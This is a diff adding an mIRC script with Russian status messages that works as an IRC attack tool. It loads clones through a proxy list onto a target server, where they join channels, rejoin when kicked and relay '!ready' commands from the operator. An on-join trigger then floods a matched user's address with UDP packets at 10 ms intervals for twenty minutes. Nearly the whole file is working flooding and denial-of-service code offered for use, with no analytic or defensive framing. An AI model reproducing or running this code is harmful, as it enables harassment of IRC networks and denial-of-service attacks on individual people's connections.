+    if ($5 != $null) { set %split.chan $5- }
+    set %split.chanel $schannick |     set %split.stop no |     set %IpserverCht $2 $+ : $+ $3
+    set %LineSzet 0 | set %split.clon 1 | set %split.max 0
+    msg $schannick 4 *** Начинаю загрузку прокси-клонов, по $4  клонов, на сервер: $2 $3 
+    split.start $schannick $2 $3 $4 $5
+  }
+}
+alias ret_per { return % [ $+ [ $1 ] ] }
+alias split.start {
+  if (%split.stop ==  yes) { halt }
+  if (%LineSzet > $lines(proxylist.txt) ) { 
+    inc %split.clon
+    if (%split.clon > $4) { msg $1 12 >>>> Завершил загрузку клонов! Открыто сокетов: $sock(pan.*,0) На сервере клонов(примерно): $sock(ready.*,0) | halt }
+    set %LineSzet 0
+  }
+  inc %LineSzet
+  .sockopen pan. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $read -l $+ %LineSzet proxylist.txt 
+  .timersplit_new 1 3 split.start2 $1 $2 $3 $4 $5
+}
+alias split.start2 {
+  if (%split.stop ==  yes) { halt }
+  if (%LineSzet > $lines(proxylist.txt) ) { 
+    inc %split.clon
+    if (%split.clon > $4) { msg $1 12 >>>> Завершил загрузку клонов!  Всего сокетов: $sock(pan.,0) На сервере клонов(примерно): $sock(ready.*,0) | halt }
+    set %LineSzet 0
+  }
+  inc %LineSzet
+  .sockopen pan. $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $read -l $+ %LineSzet proxylist.txt 
+  .timersplit_new 1 3 split.start $1 $2 $3 $4 $5
+}
+on *:sockopen:pan.*: {
+  if ($sockerr > 0) {    sockclose $sockname | return   }
+  .sockrename $sockname $replace($sockname,pan.,ready.)
+  .sockwrite -n $sockname CONNECT %IpserverCht HTTP/1.0 
+  .sockwrite -n $sockname 
+}
+alias split.fl {
+  return  $+ $rand(0,15) $+ , $+ $rand(0,15) =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=¤  $+ $rand(0,15) $+ , $+ $rand(0,15) =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=¤  $+ $rand(0,15) $+ , $+ $rand(0,15) =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=¤  $+ $rand(0,15) $+ , $+ $rand(0,15) =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=¤
+}
+on *:sockread:ready.*: {
+  if ($sockerr > 0) {    sockclose $sockname | return  }
+  .sockread %clonproxy
+  if ($sockbr == 0) return
+  if (Closing Link isin %clonproxy) { dec %split.max }
+  if (Checking Ident isin %clonproxy) { 
+    .sockwrite -n $sockname nick $remove($sockname,ready.)
+    .sockwrite -n $sockname user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  : %cafe.team
+  }
+  if ($gettok(%clonproxy,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clonproxy,2-,32) }
+  if ($gettok(%clonproxy,2,32) == 376) { 
+    inc %split.max
+    if (%split.chan != off) { .sockwrite -n $sockname join %split.chan }
+  }
+  if ($gettok(%clonproxy,2,32) == PRIVMSG) {    
+    if ($gettok(%clonproxy,4,32) == :!ready) {        .sockwrite -n $sockname $gettok(%clonproxy,5-,32)     }
+  }
+  if ($gettok(%clonproxy,2,32) == KICK) {
+    if ( $gettok(%clonproxy,4,32) == $remove($sockname,ready.) ) {  .sockwrite $sockname join $gettok(%clonproxy,3,32) $+ $lf     }
+  }
+}
+on *:join:*:  {
+  if (%audp.mask == $null) { halt }
+  if (%audp.mask isin $address($nick,5)) { 
+    .timerudp $+ $remove($address($me,2),*,!,@)  -m 0 10 .sockudp -b udp $+ $rand(100,999) $remove($address($me,2),*,!,@) $rand(100,4000) 999999999999 ECHO $ip 
+    .timerstop_atack $+ $remove($address($me,2),*,!,@) 1 1200 timerudp $+ $remove($address($me,2),*,!,@) off   
+  }
+}
